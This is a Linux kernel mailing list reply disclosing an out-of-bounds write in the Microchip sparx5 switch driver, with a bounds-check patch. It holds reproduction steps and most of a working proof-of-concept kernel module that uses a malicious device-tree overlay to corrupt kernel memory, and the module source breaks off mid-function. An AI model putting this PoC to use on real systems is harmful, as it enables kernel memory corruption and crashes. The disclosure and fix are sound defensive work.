Authentication-Results: smtp.subspace.kernel.org; arc=pass header.oldest-pass=0 smtp.remote-ip=209.85.219.53
ARC-Seal: i=2; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=pass;
	t=1794830212;
	b=MgCnl6/KD+xHRr5Jk/DyLfSkM4jDLyh9nNT9dJfJTLcbnda9T1hi0JF4uV35KE5v7Yni
	 R3AyOW4gyR6/adMgWjfuM7B0FnaUNG8O16AX257WjO91i4iEq+R2VISO8MpxdU9qC29VC
	 aStycjOs97Kb+905Ba9xmo7RCTyIKMACrQmxPLBXBRfeNO2xwvQ5Ps6ajIIJd37LF84f3
	 IpMS5bKi7Kv+NSTTCneejBzkJ+b2OiiBlfZenUxFL6K5JIQdbWKZBbmm+MNq2vB7qb7e0
	 9yhd/euyyx+g/ev7M5q/4SqrCmZljJUmK6QFEXJpnC/nYZH3DNbDy4E+sk18Lajc6fA==
ARC-Message-Signature: i=2; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1794830212;
	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
	 X-Forwarded-Encrypted:X-Gm-Message-State:X-Gm-Gg:X-Received:
	 MIME-Version:References:In-Reply-To:From:Date:X-Gm-Features:
	 Message-ID:Subject:To:Cc:Content-Type:Content-Transfer-Encoding;
	bh=VeAqYU0Ni6/tgaR6G7HFYFx3hzW8VShHVNLaUWt0yPc=;
	b=zea7c2TW3vTF8nN/Q2wEAHglmjzPdeKcOOPsIXuUdtchr5fYgDbIIxpKEPr4zAdtN1oc
	 ptkujbxErP8PXrWlN2CekzNjvuPhw3nNr648etUK4YSVrNcGYIjgbozaXhoZQBOjcOGkJ
	 7hS/H+UTEEw3FgLDWeGrRzmwGMBbLS9297m6pIscaHuxI258V90WDkcdUhUMEhPD+seq1
	 u/hhGavS3v5EwE/G3SH2o34W9XtnnqbEJHD3FORTh3EjLLmRQ4bQfQn/F97TqFt4yOLh5
	 /cMZmjMCDS2rQcbPbzAk1KZkvksYDRRfYQCdiWk8FIAVWVPUAO5QRyXK+H6k4nW6hzg==
ARC-Authentication-Results: i=2; smtp.subspace.kernel.org; 
	dmarc=pass header.from=gmail.com;
	spf=pass smtp.mailfrom=gmail.com;
	dkim=pass header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20260707 header.b=kfzPZUSX;
	arc=pass header.oldest-pass=0 smtp.remote-ip=209.85.219.53
Received: from mail-qv1-f53.google.com (mail-qv1-f53.google.com [209.85.219.53])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 971E2606A331
	for <linux-kernel@vger.kernel.org>; Mon, 16 Nov 2026 11:56:51 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 971E2606A331
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20260707 header.b=kfzPZUSX
Received: by mail-qv1-f53.google.com with SMTP id 6a1803df08f44-91e8a05ec5aso54068466d6.1
        for <linux-kernel@vger.kernel.org>; Mon, 16 Nov 2026 03:56:51 -0800 (PST)
ARC-Seal: i=1; a=rsa-sha256; t=1794830210; cv=none;
        d=google.com; s=arc-20260327;
        b=CTTVyV1873tEf1raGZtB+PMstlsXKgZP42AEH257NP4g3HC8hmotSvo4ITOqDMGcz2
         nlRCrEujpkUawz4Yipc55TG5TmwQW/3Iud2kpyWCcoM8qtq8c+pURfFuw5AjgYwTt5y0
         PXrNz3Uq0e0ZRbX+psTHMWdChFp7aYq3CcV0qDfKOyUcz2k6+wQqnb0hTen6YStMwwFf
         mvZFco8ltR27nglpYCJFq8MOYXa5g5z2l6K3yUlQDdPDu4wdavQPpHN/dc74xof1G/uN
         wTdQGo3yzoF1s4wCobdRMjjcI4B2npu1q5Gr6K0LLX+1J01LJgvPd1fMaOunvhehXCWw
         Dg6A==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:dkim-signature;
        bh=VeAqYU0Ni6/tgaR6G7HFYFx3hzW8VShHVNLaUWt0yPc=;
        fh=O784CBigPGapwy/bQSjM49MA24GQ4qUrmZt/JfU5PNw=;
        b=dxTloWxuOWspS8SdQwDWl9Zxp2Gu8Pe+fKnoDT2TSOVMDxVmnkmlFmllxIKiKCajSl
         1Az97xcHZI4uFebmSZMqFXj8ouBuHFuwItvzG6hsy7RKhc4ly2YiYkh4dALVclyL2MZo
         JO61GcITnQtIeNO3gGkQd3puTql6JRg4TWwJnPxY4JzCKgAHAEXQVjqU9tbAwrToB8yC
         d+zuYRyEoks98A/ET4Ps1MhUg2pCEXpAQ2VqsEG2eux4BlpGSCrHiPitXEn7QTgbyoQD
         NH5nWnDB/vc3pvaM4rbd3D4DnX6Rc2XuyUgWyQBzbooSuROUSonroI7omf0crNuJITfi
         LKhg==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20260707; t=1794830210; x=1795435010; darn=vger.kernel.org;
        h=content-transfer-encoding:content-type:cc:to:subject:message-id
         :date:from:in-reply-to:references:mime-version:from:to:cc:subject
         :date:message-id:reply-to:content-type;
        bh=VeAqYU0Ni6/tgaR6G7HFYFx3hzW8VShHVNLaUWt0yPc=;
        b=kfzPZUSX8jIIGFZhcToE9LJqzWlOzp+4a/E1BMV85V2Xk01Wk/y9ZeYHQ1bEBOBue+
         ARvBPMSWAQbjI21ZvA1Pb42rtiPxg/fwI2j2i92FmWh8PxRsMVDwh+QhEGZJ4+ZI26kR
         OBC+2glWzilbK75OxI6HNAlKGVDuD2qj7dWXIemlt1RSoTarfvNtwAlRbfIE5YynCuUC
         TOKoys7e/PesUtTP5fybp6phEmAtJm6L6YXM2kKCbdPuMihcAyLE5dcVSBlirztB5MB4
         +YRjBU/srjL+t4DUGauMiQiyigTM5ZhpUZodyPOdb4VzcJfjB1gE2qFBd6n08DLClwOp
         7JNw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1794830210; x=1795435010;
        h=content-transfer-encoding:content-type:cc:to:subject:message-id
         :date:from:in-reply-to:references:mime-version:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
         :content-type;
        bh=VeAqYU0Ni6/tgaR6G7HFYFx3hzW8VShHVNLaUWt0yPc=;
        b=up3DWaaOm6650BvYf0PDnoJabwy0uUlsR4ok8BIkkjxy54d5ur1sitfDAnteewYcll
         3pW+tTUtkPYVV7A2DLZ3zpDyQYznniPLhkTw8L7lQkCKPO7s06iK2lAr2ejp4RuGWm5b
         akDn0/IAD4bDccAaKeJyw3BCYES8dNk2VvK0/tlw8t/Z0yFmrJlkoCtg5SdIGF149dCq
         MHhPcX1X36/nYpk3nBk2nT4yxeMUAy65gQDA06kc9hcLzYEwPFPllVj+ScPQHfX4RTW0
         KJi7d76W0rWjc1pU6nUbWockDLZ3fxdPI3vn1R8kFhRVl6XJ0Y3xLKLc8y9kR70D2TKg
         TykQ==
X-Forwarded-Encrypted: i=1; AL+hErHWamQWCifwT/QxLOLMjMnHW5vHK3YJxfoQRmuW+BMdczBckDTLO+RPUmIh+3jLmmP+ff/aVPcQnMuvpeY=@vger.kernel.org
X-Gm-Message-State: APuU4Z9tgXp894Dqz2GmzdRN2fVrlLDlbEC8zfgjGWmAc0sflZX+Ialb
	oWtPA/lLAO9G0Jg43YOPzWShu8nVoMcXKdn8MjW3r7zwdiatB+iUXU+pJ4suhtLdIBjeVlCVmZU
	IkYr1YaDro7WeaAIUyGRuVDgGifwIBjc=
X-Gm-Gg: AZFdTZdiqXc8rt01oAJyKVTRiOfJE081Yi4dpIF+0JCg7VzvKKnog5H2RDTyLfVcnVv
	w712/wTmXiaUHIqOzo636e6es6Ol1v3oce26+q2RKDBei6pKtQYKcVYur0mycGC4kYVLhyoPLQD
	YjEmcl6dGQumn1ocwJRxuUdRKnBei2dZ2pzlrpKvUIKfbu9cTRRgu2zhxEYUafkU8OSmIIsm/24
	ag0Qm1ULbbMOKtehzJV1QYANM4+ibGcIvpSLt5rHprY4c64UvjdlGFEjmbaclc3bAWwkC3w1Pr5
	1jXdM9PYxSB3Zf0dSvr3+ot1ekBMwHLQ/tc2V9G9/LkwNfnfOQuT3xelgdgaf5rMqnTCLyzAT2q
	pGVbdsN9kYLQhS1s87UZ5MPJ5Gu1rbjyy83bIx4YXcysi8BwNuNdYjFWLBH8h
X-Received: by 2002:a05:6214:5907:b0:91f:ca0:8131 with SMTP id
 6a1803df08f44-91f24110625mr157089866d6.17.1794830210043; Mon, 16 Nov 2026
 03:56:50 -0800 (PST)
X-Mailing-List: linux-kernel@vger.kernel.org
List-Id: <linux-kernel.vger.kernel.org>
List-Post: <mailto:linux-kernel@vger.kernel.org>
List-Help: <mailto:linux-kernel+help@vger.kernel.org>
List-Subscribe: <mailto:linux-kernel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-kernel+unsubscribe@vger.kernel.org>
List-Owner: <mailto:linux-kernel+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
References: <179457014579.23820.10657909253312598784@gmail.com> <20261115221342.nlrfhxlg4ovyaq7i@DEN-DL-M70577>
In-Reply-To: <20261115221342.nlrfhxlg4ovyaq7i@DEN-DL-M70577>
From: Wang Haoran <haoranwangsec@gmail.com>
Date: Mon, 16 Nov 2026 19:56:38 +0800
X-Gm-Features: Aa3M54olKm2SWNkrOXaXI7bRsq2d5YJmHevLU5-KXSw8CEpQKDxh3bqJNY3dRQU
Message-ID: <CANZ3JQRTCKSkKG502GEMs1B4MB929bgvsXPyStE5o0q4op4DiQ@mail.gmail.com>
Subject: Re: [PATCH net-next] net: sparx5: check DT port reg against array size
To: Daniel Machon <daniel.machon@microchip.com>
Cc: Steen.Hegelund@microchip.com, UNGLinuxDriver@microchip.com, 
	netdev@vger.kernel.org, linux-arm-kernel@lists.infradead.org, 
	linux-kernel@vger.kernel.org
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

Hi Daniel,

Thanks for the review.

Answering the bot's questions first:

* How was this found: static analysis. I ran a script over all
  of_property_read_u32() call sites whose value is later used as a
  fixed-size array index (2708 call sites -> 84 candidates, each then
  reviewed manually in source). The sparx5 portno store in
  sparx5_create_port() came out of that scan.

* Was it triggered: yes. On a pristine v7.4-rc2 arm64 QEMU 'virt'
  machine with generic inline KASAN and CONFIG_SPARX5_SWITCH=3Dm,
  using an out-of-tree module that only supplies the malicious
  device-tree input:

    reg =3D 15839       BUG: KASAN: use-after-free in mchp_sparx5_probe,
                      Write of size 8 at the first byte past the
                      order-5 allocation backing struct sparx5
                      (deterministic)
    reg =3D 0x20000000  wild write 4 GiB out -> "Unable to handle kernel
                      paging request" oops in mchp_sparx5_probe
    reg =3D 65          silent corruption of the struct members past
                      ports[], later WARNING + NULL-pointer write oops
                      in sparx5_port_init

  With the patch all three inputs are rejected during DT parsing and
  probe completes normally for the valid ports. Full PoC and console
  logs are at the bottom of this mail.

* Hardware: no real SparX-5 board available. Testing was QEMU virt
  (cortex-a57) plus compile testing.

On the "device tree is considered trusted" question: that was my
concern as well, which is why I first checked what the rest of the
tree does: 52 of the 84 candidate sites the scan surfaced already
carry exactly this style of bounds check (a ">=3D ARRAY_SIZE(x)" or
">=3D num_x" test before the store). And lan966x_probe_port() in the
same driver family does the same check on its fwnode path, so I
followed that precedent. Happy to drop the patch if you would rather
treat the DT as trusted here.

A v2 follows with the check against sparx5->data->consts->n_ports as
you suggested (lan969x has n_ports =3D 30 and goes through this same
probe), the information above in the commit message, and a
get_maintainers.pl CC list.

The rest of this mail is the PoC and verification detail.

1. Impact summary
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

The write address is alloc_base + 0x1088 + portno * 8 with portno an
arbitrary u32 taken from the DT 'reg' property (up to a 2 GiB
displacement). Verified on the clean kernel:

  reg value  write lands at                              observed result
  ---------  ------------------------------------------
--------------------------
  65         first slot past ports[], still inside       silent corruption =
of
             struct sparx5 (coreclock/stats fields)     coreclock/stats, la=
ter
                                                        WARNING + NULL-poin=
ter
                                                        write oops in
                                                        sparx5_port_init
  15839      first byte past the 128 KiB (order-5)       BUG: KASAN:
             allocation backing struct sparx5           use-after-free in
                                                        mchp_sparx5_probe,
                                                        deterministic
  0x20000000 linear-map address +4 GiB                   Unable to handle
                                                        kernel paging reque=
st,
                                                        oops at the store

2. PoC design (poc_sparx5_oob.c)
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D

The module only delivers input the driver already trusts:

  1. Malicious DT overlay (evil_overlay.dts, embedded as a blob): adds a
     poc-sparx5 switch node with three MMIO windows and one
     ethernet-port whose reg is a placeholder, patched at module load to
     the chosen value. of_overlay_fdt_apply() -> of_platform_notify()
     auto-creates the platform devices, so the *clean* driver's probe
     runs inside the apply call -- the full chain is visible in the
     KASAN stack trace.

  2. Stub serdes PHY provider -- probe requires devm_of_phy_get().

  3. Fake register file -- mem=3D700M on a -m 1G QEMU guest carves the RAM
     tail [0x6bc00000, 0x80000000) out of the memory map (pfn_valid()
     is false there, so the driver's devm_ioremap() succeeds). Only two
     value-deciding register reads happen before the port-creation loop,
     both prefilled: GCB_CHIP_ID.PART_ID =3D 0x7546 and
     HSCH_RESET_CFG.CORE_ENA =3D 1; every other access is a write or a
     read-modify-write that does not branch on the value.

Threat model: the parsed device tree is attacker-controlled data in
several realistic scenarios -- runtime DT overlays (CONFIG_OF_OVERLAY),
a corrupted or maliciously replaced DTB (kexec --dtb is the trivially
reachable variant), or bootloader DT fixups on SparX-5 boards.

3. Results
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

Unpatched:

  mode 0 (reg =3D 15839) -> BUG: KASAN: use-after-free in
      mchp_sparx5_probe+0x3464 [sparx5_switch], Write of size 8, at the
      first byte past the order-5 allocation (shadow 00...00 | ff ff ff
      boundary). Deterministic.

  mode 1 (reg =3D 0x20000000) -> Unable to handle kernel paging request,
      oops, pc =3D mchp_sparx5_probe (KASAN inline check faults reading
      unmapped shadow; without KASAN the store itself faults).

  mode 2 (reg =3D 65) -> silent overwrite of ports[65] (coreclock etc.),
      probe continues, secondary effect: NULL-pointer write (0x4) oops
      in sparx5_port_init+0x1028.

Patched (the exact diff from the patch email, rebuilt into the driver):

  mode 0: sparx5-switch 6bc00000.poc-sparx5: port 15839: reg out of range
  mode 1: sparx5-switch 6bc00000.poc-sparx5: port 536870912: reg out of ran=
ge
  mode 2: sparx5-switch 6bc00000.poc-sparx5: port 65: reg out of range
  -> KASAN reports / oopses: 0 in all three modes; the bad node is
     skipped during DT parsing and probe completes normally for the
     valid ports.

Evidence excerpts for all of the above are inlined at the end of this
mail; full untrimmed console logs available on request.

4. Reproduction
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

Host: aarch64 gcc 14.3 cross toolchain, qemu-system-aarch64 (virt,
cortex-a57, -smp 2 -m 1G), busybox initramfs. Kernel fragment:
KASAN_GENERIC + KASAN_INLINE + OF_OVERLAY + SPARX5_SWITCH=3Dm (plus
bridge/phylink module deps).

    ./poc/mkinitramfs.sh        # packs init + clean .ko files
    ./poc/run-qemu.sh 0 1       # mode 0/1/2, auto-poweroff
    # boot cmdline: mem=3D700M kasan_multi_shot=3D1 panic=3D-1

Inside the guest /init loads the dependency modules, then
insmod poc_sparx5_oob.ko mode=3D$poc_mode, echoes dmesg, powers off.

5. PoC source (poc_sparx5_oob.c)
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D

----8<---- poc_sparx5_oob.c ----
// SPDX-License-Identifier: GPL-2.0
/*
 * poc_sparx5_oob.c - PoC: OOB write via unchecked DT 'reg' port number in
 * the Microchip Sparx5 switch driver of an *unmodified* upstream kernel.
 *
 * Note: this PoC was developed with the assistance of an AI tool (Claude).
 *
 * Vulnerable code (drivers/net/ethernet/microchip/sparx5/sparx5_main.c,
 * kernel 7.4-rc2 -- no bounds check anywhere on the path):
 *
 *   mchp_sparx5_probe():
 *           err =3D of_property_read_u32(portnp, "reg", &portno);
 *           ...
 *           config->portno =3D portno;
 *   sparx5_create_port():
 *           sparx5->ports[config->portno] =3D spx5_port;   <-- OOB write
 *
 *   struct sparx5::ports[] has SPX5_PORTS (65) entries; the struct is
 *   allocated with devm_kzalloc_obj() (plain kmalloc, ~83KB here).
 *
 * Attack surface being modelled: the device tree the driver parses is
 * attacker-controlled data (runtime DT overlay, malicious DTB, kexec-suppl=
ied
 * DTB, bootloader DT fixups on SparX-5 boards).  This module delivers
 * exactly that input and nothing more:
 *
 *   1. applies a runtime device tree overlay (evil_overlay.dtbo compiled
 *      from evil_overlay.dts) that instantiates a sparx5-switch node with
 *      one ethernet port whose 'reg' is out of range   [the malicious inpu=
t]
 *   2. provides a stub serdes PHY provider   (probe needs devm_of_phy_get)
 *   3. prefills a RAM window carved out via 'mem=3D700M' that stands in fo=
r
 *      the switch register file:
 *        - GCB_CHIP_ID.PART_ID =3D 0x7546   (steers init_features/corecloc=
k)
 *        - HSCH_RESET_CFG.CORE_ENA =3D 1    (skips the RAM-init poll loop)
 *      Every other register access before the port-creation loop is a pure
 *      write or a read-modify-write that does not branch on the value.
 *
 * Then it creates the platform device; the *clean* in-tree driver performs
 * the out-of-bounds write all by itself.
 *
 * Modes (module param 'mode', or explicit port number via 'regno'):
 *   0 (default) - land the write just past the end of the order-5 (128K)
 *                 allocation backing struct sparx5 -> KASAN report on the
 *                 poisoned free buddy page
 *   1           - wild write far past the linear map -> kernel oops
 *   2           - reg=3D65: first OOB slot, silent in-struct corruption
 *                 (hits coreclock / num_stats / stats_layout / stats)
 *
 * Note: devm_kzalloc()'s alloc_dr() rounds the request up to the full kmal=
loc
 * bucket, so KASAN has NO redzone between sizeof(struct sparx5) and the 12=
8K
 * block end -- writes in that window are invisible to KASAN (verified live=
).
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/io.h>
#include <linux/mm.h>
#include <linux/slab.h>
#include <linux/platform_device.h>
#include <linux/phy/phy.h>
#include <linux/of.h>
#include <linux/of_platform.h>

/* struct sparx5 layout (sizeof/offsetof) straight from the driver headers =
*/
#include "sparx5_main.h"

/* compiled from evil_overlay.dts; placeholder reg 0xdeadbee1 */
#include "evil_overlay_blob.h"

/* ---- fake register file: RAM tail carved out with mem=3D700M on -m 1G --=
-- *
 * guest RAM [0x40000000, 0x80000000), usable capped at 0x6bc00000, so the
 * window [0x6bc00000, 0x80000000) backs the whole ~296MB physical span of
 * the switch's register map (targets up to offset 0x11b00000).
 */
#define REG_BASE        0x6BC00000UL
#define REG_WINDOW      0x11B10000UL

/*
 * Register offsets inside the fake window (relative to REG_BASE), derived
 * from the driver's own tables for this exact tree:
 *   regs[TARGET_GCB]  =3D res2.start            (GCB is the first range-2
 *                                             iomap entry, offset 0x110100=
00)
 *   regs[TARGET_HSCH] =3D res2.start - 0x11010000 + 0x11580000
 *   GCB_CHIP_ID       =3D regs[TARGET_GCB] + 0
 *   HSCH_RESET_CFG    =3D regs[TARGET_HSCH] + gaddr[GA_HSCH_MMGT](=3D16236=
8)
 *                                                                + raddr(=
=3D8)
 */
#define GCB_CHIP_ID_OFF         0x11010000u
#define HSCH_RESET_CFG_OFF      0x115A7A48u

/* GCB_CHIP_ID.PART_ID is bits 27:12; SPX5_TARGET_CT_7546 =3D 0x7546 */
#define CHIP_ID_VALUE           (0x7546u << 12)
/* HSCH_RESET_CFG.CORE_ENA =3D BIT(0) */
#define RESET_CFG_VALUE         1u

#define PLACEHOLDER_REG         0xdeadbee1u

static unsigned int mode =3D 0;
module_param(mode, uint, 0444);
MODULE_PARM_DESC(mode, "0=3DKASAN redzone (default), 1=3Dwild write oops,
2=3Dreg 65 silent");

static unsigned int regno;
module_param(regno, uint, 0444);
MODULE_PARM_DESC(regno, "explicit port number override (takes precedence)")=
;

static struct device_node *root_np, *phy_np, *sw_np;
static struct platform_device *phy_pdev, *sw_pdev;
static void __iomem *regs_win;
static void *blob;
static int ovcs_id =3D -1;

/* ------------------------------------------------------------------ */
/* stub serdes PHY provider                                            */
/* ------------------------------------------------------------------ */

/* read a KASAN shadow byte directly (KASAN_SHADOW_OFFSET from .config) */
#define POC_KASAN_OFFSET        0xdfff800000000000UL
static void poc_dump_shadow(const char *tag, void *addr)
{
        u8 s =3D *(volatile u8 *)(((unsigned long)addr >> 3) + POC_KASAN_OF=
FSET);

        pr_info("poc: shadow[%s addr=3D%px] =3D 0x%02x\n", tag, addr, s);
}

static int poc_phy_stub(struct phy *phy)
{
        return 0;
}

static int poc_phy_set_mode(struct phy *phy, enum phy_mode mode, int submod=
e)
{
        return 0;
}

static const struct phy_ops poc_phy_ops =3D {
        .init           =3D poc_phy_stub,
        .exit           =3D poc_phy_stub,
        .power_on       =3D poc_phy_stub,
        .power_off      =3D poc_phy_stub,
        .set_mode       =3D poc_phy_set_mode,
        .owner          =3D THIS_MODULE,
};

static struct phy *poc_phy_xlate(struct device *dev,
                                 const struct of_phandle_args *args)
{
        return dev_get_drvdata(dev);
}

static int poc_phy_probe(struct platform_device *pdev)
{
        struct phy_provider *provider;
        struct phy *phy;

        phy =3D devm_phy_create(&pdev->dev, pdev->dev.of_node, &poc_phy_ops=
);
        if (IS_ERR(phy))
                return PTR_ERR(phy);

        platform_set_drvdata(pdev, phy);

        provider =3D devm_of_phy_provider_register(&pdev->dev, poc_phy_xlat=
e);
        if (IS_ERR(provider))
                return PTR_ERR(provider);

        dev_info(&pdev->dev, "stub serdes PHY provider registered\n");
        return 0;
}

static const struct of_device_id poc_phy_of_match[] =3D {
        { .compatible =3D "poc,stub-phy" },
        { }
};

static struct platform_driver poc_phy_driver =3D {
        .probe =3D poc_phy_probe,
        .driver =3D {
                .name =3D "poc-stub-phy",
                .of_match_table =3D poc_phy_of_match,
        },
};

/* ------------------------------------------------------------------ */
/* evil port number selection                                          */
/* ------------------------------------------------------------------ */

static u32 poc_pick_evil_portno(void)
{
        size_t size =3D sizeof(struct sparx5);
        size_t off  =3D offsetof(struct sparx5, ports);
        size_t objsz;

        /* devm_kzalloc_obj -> kmalloc(sizeof) - no dedicated cache */
        objsz =3D kmalloc_size_roundup(size);

        pr_info("poc: sizeof(struct sparx5)=3D%zu (0x%zx) offsetof(ports)=
=3D0x%zx "
                "kmalloc backing=3D%zu (0x%zx)\n",
                size, size, off, objsz, objsz);

        if (regno)
                return regno;

        switch (mode) {
        case 2:
                return 65;      /* ports[65] =3D=3D coreclock/num_stats */
        case 1:
                /* +4GiB: outside the linear map -> translation fault at th=
e
                 * store instruction inside sparx5_create_port() */
                return (u32)((4UL << 30) >> 3);
        default:
                /*
                 * NOTE: devm_kzalloc() routes through alloc_dr(), which
                 * allocates kmalloc_size_roundup(sizeof(struct devres)=3D0=
x80
                 * + size) =3D the FULL 128K bucket.  Generic KASAN therefo=
re
                 * has no requested-size redzone for this object at all
                 * (verified live: shadow at obj+size+0x100 is 0x00) -- whi=
ch
                 * is exactly why this bug survives KASAN testing.
                 *
                 * So aim at the first byte PAST the order-5 block instead:
                 *   write =3D alloc_base + 0x80 (devres hdr) + 0x1088
                 *           + portno*8  =3D=3D  alloc_base + 0x20000
                 * The neighbouring page is free buddy memory whose shadow =
is
                 * KASAN-poisoned (0xff) -> deterministic report.
                 */
                return (u32)((0x20000UL - 0x1108UL) >> 3);      /* 15839 */
        }
}

/* ------------------------------------------------------------------ */
/* malicious overlay                                                   */
/* ------------------------------------------------------------------ */

static int poc_apply_overlay(u32 evil)
{
        __be32 marker =3D cpu_to_be32(PLACEHOLDER_REG);
        u32 repl =3D cpu_to_be32(evil);
        int count =3D 0;
        u8 *p, *end;
        int ret;

        blob =3D kmemdup(evil_overlay_dtbo, evil_overlay_dtbo_len, GFP_KERN=
EL);
        if (!blob)
                return -ENOMEM;

        /* patch the placeholder port reg in the writable blob */
        end =3D blob + evil_overlay_dtbo_len - 4;
        for (p =3D blob; p <=3D end; p++) {
                if (!memcmp(p, &marker, 4)) {
                        memcpy(p, &repl, 4);
                        count++;
                }
        }
        if (count !=3D 1) {
                pr_err("poc: placeholder patch count %d (!=3D 1), aborting\=
n",
                       count);
                ret =3D -EINVAL;
                goto err_free;
        }

        ret =3D of_overlay_fdt_apply(blob, evil_overlay_dtbo_len, &ovcs_id,
                                   root_np);
        if (ret) {
                pr_err("poc: overlay apply failed: %d\n", ret);
                goto err_free;
        }

        phy_np =3D of_find_node_by_name(root_np, "poc-stub-phy");
        sw_np  =3D of_find_node_by_name(root_np, "poc-sparx5");
        if (!phy_np || !sw_np) {
                pr_err("poc: overlay nodes not found (phy=3D%p sw=3D%p)\n",
                       phy_np, sw_np);
                ret =3D -ENOENT;
                goto err_remove;
        }

        pr_info("poc: malicious overlay applied, evil port reg =3D <%u> (0x=
%x)\n",
                evil, evil);
        return 0;

err_remove:
        of_overlay_remove(&ovcs_id);
        ovcs_id =3D -1;
err_free:
        kfree(blob);
        blob =3D NULL;
        return ret;
}

static void poc_remove_overlay(void)
{
        if (sw_pdev)
                of_platform_device_destroy(&sw_pdev->dev, NULL);
        if (phy_pdev)
                of_platform_device_destroy(&phy_pdev->dev, NULL);
        if (ovcs_id >=3D 0) {
                of_overlay_remove(&ovcs_id);
                ovcs_id =3D -1;
        }
        kfree(blob);
        blob =3D NULL;
}

/* ------------------------------------------------------------------ */

static int __init poc_init(void)
{
        u32 evil;
        int ret;

        pr_info("poc: sparx5 DT 'reg' OOB write PoC (mode=3D%u regno=3D%u)\=
n",
                mode, regno);

        root_np =3D of_find_node_by_path("/");
        if (!root_np) {
                pr_err("poc: no root node?!\n");
                return -ENOENT;
        }

        /* KASAN detector self-test (validates the harness, not the bug):
         * same allocation geometry as the driver's struct sparx5. */
        {
                size_t sz =3D sizeof(struct sparx5);
                struct platform_device *dummy;
                u8 *t;

                t =3D kmalloc(sz, GFP_KERNEL);
                pr_info("poc: kasan self-test1: kmalloc(%zu)=3D%px,
store at +%zu\n",
                        sz, t, sz + 0x100);
                if (t) {
                        poc_dump_shadow("selftest1 redzone", t + sz + 0x100=
);
                        *(volatile u32 *)(t + sz + 0x100) =3D 0x41414141;
                        pr_info("poc: kasan self-test1 store done\n");
                        kfree(t);
                }

                /* replicate the driver's exact allocation path:
                 * devm_kzalloc_obj() -> devm_kzalloc(dev, sizeof,
GFP_KERNEL) */
                dummy =3D platform_device_register_simple("poc-dummy",
PLATFORM_DEVID_NONE, NULL, 0);
                if (!IS_ERR(dummy)) {
                        t =3D devm_kzalloc(&dummy->dev, sz, GFP_KERNEL);
                        pr_info("poc: kasan self-test2:
devm_kzalloc(%zu)=3D%px\n", sz, t);
                        if (t) {
                                poc_dump_shadow("selftest2 redzone", t
+ sz + 0x100);
                                poc_dump_shadow("selftest2 in-obj ", t
+ 0x1000);
                                *(volatile u32 *)(t + sz + 0x100) =3D 0x424=
24242;
                                pr_info("poc: kasan self-test2 store done\n=
");
                        }
                        platform_device_unregister(dummy);
                }
        }

        evil =3D poc_pick_evil_portno();

        /* 1. diagnostics: probe the register windows exactly like the
         *    driver's devm_ioremap() will */
        {
                const resource_size_t dbase[3] =3D {
                        REG_BASE, REG_BASE + 0x10004000, REG_BASE + 0x11010=
000
                };
                const resource_size_t dsize[3] =3D {
                        0x401000, 0x7fc000, 0xaf0000
                };
                void __iomem *t;
                int i;

                for (i =3D 0; i < 3; i++) {
                        t =3D ioremap(dbase[i], dsize[i]);
                        pr_info("poc: diag ioremap(pa %#llx +%#llx) =3D %px=
\n",
                                (u64)dbase[i], (u64)dsize[i], t);
                        if (t)
                                iounmap(t);
                }
        }

        /* 2. prefill the fake register file (must happen before probe,
         *    which now runs during overlay application) */
        regs_win =3D ioremap(REG_BASE, REG_WINDOW);
        if (!regs_win) {
                pr_err("poc: ioremap of register window failed\n");
                ret =3D -ENOMEM;
                goto err_root;
        }
        writel(CHIP_ID_VALUE, regs_win + GCB_CHIP_ID_OFF);
        writel(RESET_CFG_VALUE, regs_win + HSCH_RESET_CFG_OFF);
        pr_info("poc: prefilled GCB_CHIP_ID=3D%#x @pa %#lx,
HSCH_RESET_CFG=3D%#x @pa %#lx\n",
                CHIP_ID_VALUE, (unsigned long)REG_BASE + GCB_CHIP_ID_OFF,
                RESET_CFG_VALUE, (unsigned long)REG_BASE + HSCH_RESET_CFG_O=
FF);

        /* 3. stub phy provider driver must be registered before the overla=
y
         *    applies (the notifier creates its platform device and probes
         *    it during of_overlay_fdt_apply()) */
        ret =3D platform_driver_register(&poc_phy_driver);
        if (ret) {
                pr_err("poc: phy driver register failed\n");
                goto err_root;
        }

        /* 4. apply the malicious overlay.  of_platform_notify() creates th=
e
         *    platform devices for the new nodes right away, so the clean
         *    mchp_sparx5_probe() runs INSIDE this call and performs the OO=
B
